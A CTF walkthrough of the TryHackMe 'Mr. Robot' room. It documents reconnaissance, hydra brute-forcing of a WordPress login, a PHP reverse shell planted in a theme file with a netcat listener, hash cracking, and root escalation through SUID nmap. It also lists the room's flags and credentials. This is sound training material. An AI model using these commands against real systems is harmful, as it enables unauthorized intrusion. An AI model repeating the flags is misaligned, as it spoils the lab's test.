@@ -1,0 +1,447 @@
+Mr. Robot - https://tryhackme.com/room/mrrobot
+
+====================Questions=========================
+
+1.) What is Key 1
+    073403c8a58a1f80d943455fb30724b9
+2.) What is Key 2
+    822c73956184f694993bede3eb39f959
+3.) What is Key 3
+    04787ddef27c3dee1ee161b21670b4e4
+
+======================Usernames & Passwords==================
+
+Elliot:ER28-0652
+mich05654:_______
+robot:abcdefghijklmnopqrstuvwxyz
+
+=======================Walk-Through====================
+Step 1: Visit IP Address In Browser With Burp Suite Running
+
+-Mimics loading a computer
+
+-Mimics logging into a computer with the following:
+
+mrrobot login: root
+password:
+
+-Loads to a website that is a replica of a command prompt.
+    -We can enter the following commands
+        1.) prepare
+        2.) fsociety
+        3.) inform
+        4.) question
+        5.) wakeup
+        6.) join
+
+The above all seem to be directories. Will attempt to attack them.
+============================================================================
+Step 2: Nmap IP Address
+
+================
+
+-Fast nmap
+    └─$ sudo nmap -f -Pn -sC -sV -O  10.10.114.112
+        Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+        Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 17:38 EST
+        Nmap scan report for 10.10.114.112
+        Host is up (0.23s latency).
+        Not shown: 997 filtered ports
+        
+        PORT    STATE  SERVICE  VERSION
+        22/tcp  closed ssh
+        
+        80/tcp  open   http     Apache httpd
+        |_http-server-header: Apache
+        |_http-title: Site doesn't have a title (text/html).
+        
+        443/tcp open   ssl/http Apache httpd
+        |_http-server-header: Apache
+        |_http-title: Site doesn't have a title (text/html).
+        | ssl-cert: Subject: commonName=www.example.com
+        | Not valid before: 2015-09-16T10:45:03
+        |_Not valid after:  2025-09-13T10:45:03
+        
+        Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 5.4 (90%), Crestron XPanel control system (89%)
+        No exact OS matches for host (test conditions non-ideal).
+
+
+============================================================================
+
+-Long nmap
+    └─$ sudo nmap -A -Pn  10.10.114.112 
+        Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+        Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 17:41 EST
+        Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+        SYN Stealth Scan Timing: About 4.30% done; ETC: 17:43 (0:01:29 remaining)
+        Nmap scan report for 10.10.114.112
+        Host is up (0.22s latency).
+        Not shown: 997 filtered ports
+
+        PORT    STATE  SERVICE  VERSION
+        22/tcp  closed ssh
+        
+        80/tcp  open   http     Apache httpd
+        |_http-server-header: Apache
+        |_http-title: Site doesn't have a title (text/html).
+        
+        443/tcp open   ssl/http Apache httpd
+        |_http-server-header: Apache
+        |_http-title: Site doesn't have a title (text/html).
+        | ssl-cert: Subject: commonName=www.example.com
+        | Not valid before: 2015-09-16T10:45:03
+        |_Not valid after:  2025-09-13T10:45:03
+        
+        Device type: general purpose|specialized|storage-misc|WAP|broadband router|printer
+        Running (JUST GUESSING): Linux 3.X|5.X|4.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
+        OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
+        Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 5.4 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)
+        No exact OS matches for host (test conditions non-ideal).
+        Network Distance: 4 hops
+
+        TRACEROUTE (using port 22/tcp)
+        HOP RTT       ADDRESS
+        1   91.88 ms  10.13.0.1
+        2   ... 3
+        4   228.12 ms 10.10.114.112
+
+
+============================================================================
+
+Step 3: See if there is a robot.txt file 
+
+-robots.txt file does exits
+    http://10.10.114.112/robots.txt
+        User-agent: *
+        fsocity.dic
+            -http://10.10.114.112/fsocity.dic <== Appears to be a word list
+            -Saved to Desktop. Will use this during directory traversal stages
+        key-1-of-3.txt <===Contains key 1
+
+key 1: 073403c8a58a1f80d943455fb30724b9
+
+============================================================================
+Step 4: Gobuster or DirBuster
+
+─$ gobuster dir -e -u http://10.10.114.112/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
+
+
+└─$ gobuster dir -e -u http://10.10.114.112/ -w /home/bziolo/Desktop/fsocity.dic -t 64                                                                                                                                                 1 ⨯
+    ===============================================================
+    Gobuster v3.0.1
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+    ===============================================================
+    [+] Url:            http://10.10.114.112/
+    [+] Threads:        64
+    [+] Wordlist:       /home/bziolo/Desktop/fsocity.dic
+    [+] Status codes:   200,204,301,302,307,401,403
+    [+] User Agent:     gobuster/3.0.1
+    [+] Expanded:       true
+    [+] Timeout:        10s
+    ===============================================================
+    2021/02/25 18:00:14 Starting gobuster
+    ===============================================================
+    http://10.10.114.112/images (Status: 301)
+        -You don't have permission to access /images/ on this server.
+    http://10.10.114.112/css (Status: 301)
+        -You don't have permission to access /css/ on this server.
+    
+    http://10.10.114.112/image (Status: 301)
+        -Sends us to a "user's blog" page
+        -Wordpress website
+        -Headers have an interesting URL: http://10.10.114.112/?attachment_id=23/feed/
+            -Might be able to take advantage of the id field
+    
+    http://10.10.114.112/license (Status: 200)
+        -what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+    
+    http://10.10.114.112/video (Status: 301)
+        -You don't have permission to access /video/ on this server.
+    http://10.10.114.112/audio (Status: 301)
+        -You don't have permission to access /audio/ on this server.
+    http://10.10.114.112/feed (Status: 301)
+        -xml of the wordpress site. very short
+    
+    http://10.10.114.112/admin (Status: 301)
+        -Loads to a screen that mimics a blinking console but nothing happnes.
+        -Possibly need to dive deeper
+        -Line in the F12 source code -The document has moved <a href="http://10.10.168.165/admin/">here</a>.
+    
+    http://10.10.114.112/blog (Status: 301)
+        -You don't have permission to access /blog/ on this server.
+    http://10.10.114.112/Image (Status: 301)
+        -takes you to user's blog page as described above
+    http://10.10.114.112/intro (Status: 200)
+        -Video asking "Are you ready to join fsociety"
+    
+    http://10.10.114.112/rss (Status: 301)
+        --xml of the wordpress site. very short. Same as /feed
+    http://10.10.114.112/login (Status: 302)
+        -Leads to wordpress login page http://10.10.168.165/wp-login.php
+    http://10.10.114.112/readme (Status: 200)
+        -I like where you head is at. However I'm not going to help you. 
+    http://10.10.114.112/Year201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901 (Status: 403)
+
+
+
+
+-Gobuster 2nd attempt
+    └─$ gobuster dir -e -u http://10.10.191.224/wp-admin/ -w /home/bziolo/Desktop/fsocity.dic -t 64 
+    ===============================================================
+    Gobuster v3.0.1
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+    ===============================================================
+    [+] Url:            http://10.10.191.224/wp-admin/
+    [+] Threads:        64
+    [+] Wordlist:       /home/bziolo/Desktop/fsocity.dic
+    [+] Status codes:   200,204,301,302,307,401,403
+    [+] User Agent:     gobuster/3.0.1
+    [+] Expanded:       true
+    [+] Timeout:        10s
+    ===============================================================
+    2021/02/26 00:18:14 Starting gobuster
+    ===============================================================
+    http://10.10.191.224/wp-admin/images (Status: 301)
+    http://10.10.191.224/wp-admin/css (Status: 301)
+    http://10.10.191.224/wp-admin/user (Status: 301)
+    http://10.10.191.224/wp-admin/edit (Status: 302)
+    http://10.10.191.224/wp-admin/options (Status: 302)
+    http://10.10.191.224/wp-admin/revision (Status: 302)
+    http://10.10.191.224/wp-admin/about (Status: 302)
+    http://10.10.191.224/wp-admin/link (Status: 302)
+    http://10.10.191.224/wp-admin/feed (Status: 301)
+    http://10.10.191.224/wp-admin/network (Status: 301)
+    http://10.10.191.224/wp-admin/index (Status: 302)
+    http://10.10.191.224/wp-admin/upload (Status: 302)
+    http://10.10.191.224/wp-admin/comment (Status: 302)
+    http://10.10.191.224/wp-admin/media (Status: 302)
+    http://10.10.191.224/wp-admin/users (Status: 302)
+    http://10.10.191.224/wp-admin/admin (Status: 302)
+    http://10.10.191.224/wp-admin/includes (Status: 301)
+    http://10.10.191.224/wp-admin/post (Status: 302)
+    http://10.10.191.224/wp-admin/profile (Status: 302)
+    http://10.10.191.224/wp-admin/update (Status: 302)
+    http://10.10.191.224/wp-admin/credits (Status: 302)
+    http://10.10.191.224/wp-admin/rss (Status: 301)
+    http://10.10.191.224/wp-admin/customize (Status: 302)
+    http://10.10.191.224/wp-admin/tools (Status: 302)
+    http://10.10.191.224/wp-admin/export (Status: 302)
+    http://10.10.191.224/wp-admin/Year201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901 (Status: 403)
+    http://10.10.191.224/wp-admin/user (Status: 301)
+    http://10.10.191.224/wp-admin/images (Status: 301)
+    http://10.10.191.224/wp-admin/css (Status: 301)
+    http://10.10.191.224/wp-admin/edit (Status: 302)
+    http://10.10.191.224/wp-admin/options (Status: 302)
+    http://10.10.191.224/wp-admin/revision (Status: 302)
+    http://10.10.191.224/wp-admin/about (Status: 302)
+    http://10.10.191.224/wp-admin/link (Status: 302)
+    http://10.10.191.224/wp-admin/feed (Status: 301)
+
+
+
+-Dirbuster completed
+    -Documents can be found on Desktop
+
+-Contains a file licenese.txt
+    -Simple webpage that says = what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+    -When you look at the source code there is something on the tail end of it
+        -ZWxsaW90kVSMjgtMDY1Mgo=
+
+Possible Password: ZWxsaW90kVSMjgtMDY1Mgo=
+
+============================================================================
+Step 5: Typing in Search box on /Image
+
+-Loads the main page when you first visit the website
+    -However, the url is now http://10.10.168.165/?s=hello
+    -We could possibily try to find commands
+
+
+
+============================================================================
+Step 6: Check Wordpress website for known vulernabilities
+
+Wordpress 4.3.1
+
+-There seems to be vulernabilities but nothing that would work on this site
+-Seems like you need to get access to the backend before you can use any of these
+============================================================================
+Step 7:
+
+-I feel I have come to a deadend. I believe elliot or Elliot is a username.
+-Going to begin brute-forcing the wordpress login page
+    -└─$ hydra -l Elliot -P /home/bziolo/Desktop/fsocity.dic 10.10.216.154 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -vv -t 80
+        -Username: Elliot
+        -Password: ER28-0652
+============================================================================
+Step 8: We have access to backend of wordpress website. Get reverse shell
+
+-There is another use on the box:
+    -Username: mich05654
+    -Name: krista Gordon
+    -Email: kgordon@therapist.com
+    -Role: Subscriber
+
+-Get reverse shell (no metasploit)
+    -We ned to find a file or page we can write to
+        -Go to "Apperances" in the left hand side menu
+        -You can see the active template "Twenty Fifteen"
+        -Click on Editor on the left hand side menu
+        -You will see pages now appear on the right hand side menu
+        -Click on 404 page not found
+        -Note the path to the page: http://10.10.78.92/wp-admin/theme-editor.php?file=404.php
+        -I used pentest monkey's php reverse shell code: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+        -Start netcat listener
+        -Navigate to 404 not found page: http://10.10.78.92/wp-admin/404.php
+
+-We have reverse shell
+    -└─$ nc -nvlp 1234
+    listening on [any] 1234 ...
+    connect to [10.13.7.29] from (UNKNOWN) [10.10.78.92] 54030
+    Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+    21:56:47 up 55 min,  0 users,  load average: 0.00, 0.01, 0.26
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=1(daemon) gid=1(daemon) groups=1(daemon)
+    /bin/sh: 0: can't access tty; job control turned off
+    $
+============================================================================
+Step 7: Determine what is available on the machine - LinPeas.sh
+
+$ whoami
+    -daemon
+
+-Uploaded & Ran LinPeas.sh
+    [-] Users that have previously logged onto the system:
+    Username         Port     From             Latest
+    root             tty1                      Sat Nov 14 23:32:42 +0000 2015
+    bitnamiftp       tty1                      Fri Nov 13 01:15:03 +0000 2015
+    robot            tty1                      Fri Nov 13 23:50:42 +0000 2015
+
+
+    [-] Are permissions on /home directories lax:
+    total 12K
+    drwxr-xr-x  3 root root 4.0K Nov 13  2015 .
+    drwxr-xr-x 22 root root 4.0K Sep 16  2015 ..
+    drwxr-xr-x  2 root root 4.0K Nov 13  2015 robot
+
+-Found Key #2
+    $ cd robot
+    $ ls -al
+    total 16
+    drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+    drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+    -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+    -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+
+-Decode Raw-MD5 hash using John the Ripper
+    -└─$ john --format=raw-md5 --wordlist=/home/bziolo/Desktop/rockyou.txt /home/bziolo/Desktop/hash.txt
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+    Warning: no OpenMP support for this hash type, consider --fork=2
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    
+    abcdefghijklmnopqrstuvwxyz (?)
+    
+    1g 0:00:00:00 DONE (2021-02-27 18:28) 100.0g/s 4051Kp/s 4051Kc/s 4051KC/s bonjour1..123092
+    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+    Session completed
+
+
+
+============================================================================
+Step 8: Horizontal Privilege Escalation
+
+-We attempt to use "su" command but since we do not have ttyl/terminal we can not
+
+-Upgrade shell
+    -python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+-Switch users to robot
+    daemon@linux:/home/robot$ su robot
+    su robot
+    Password: abcdefghijklmnopqrstuvwxyz
+    robot@linux:~$ 
+
+-We are now the user robot
+
+robot@linux:~$ cat key-2-of-3.txt
+    cat key-2-of-3.txt
+    822c73956184f694993bede3eb39f959
+
+============================================================================
+Step 9: Vertical Privilege Escalation
+
+-Robot can not run sudo commands
+
+-Check what files have SUID permission
+    robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
+    find / -perm -u=s -type f 2>/dev/null
+    /bin/ping
+    /bin/umount
+    /bin/mount
+    /bin/ping6
+    /bin/su
+    /usr/bin/passwd
+    /usr/bin/newgrp
+    /usr/bin/chsh
+    /usr/bin/chfn
+    /usr/bin/gpasswd
+    /usr/bin/sudo
+    /usr/local/bin/nmap
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+    /usr/lib/pt_chown
+
+
+GTFO Bins - https://gtfobins.github.io/gtfobins/nmap/
+    Shell
+    It can be used to break out from restricted environments by spawning an interactive system shell.
+
+        A.) Input echo is disabled.
+            TF=$(mktemp)
+            echo 'os.execute("/bin/sh")' > $TF
+            nmap --script=$TF
+
+        B.) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+            nmap --interactive
+            nmap> !sh
+
+-Looks like we can abuse the nmap SUID permisson
+    robot@linux:~$ nmap --interactive
+    nmap --interactive
+
+    Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+    Welcome to Interactive Mode -- press h <enter> for help
+    nmap> !sh
+    !sh
+
+    # 
+    #whoami
+    whoami
+    root
+
+-We are now root
+    # cd root
+        
+    # ls -al
+        total 32
+        drwx------  3 root root 4096 Nov 13  2015 .
+        drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+        -rw-------  1 root root 4058 Nov 14  2015 .bash_history
+        -rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+        drwx------  2 root root 4096 Nov 13  2015 .cache
+        -rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+        -r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+        -rw-r--r--  1 root root  140 Feb 20  2014 .profile
+        -rw-------  1 root root 1024 Sep 16  2015 .rnd
+
+    # cat key-3-of-3.txt
+        cat key-3-of-3.txt
+        04787ddef27c3dee1ee161b21670b4e4
+
+Key#3 04787ddef27c3dee1ee161b21670b4e4
+
+
+BOX OWNED! Congrats!
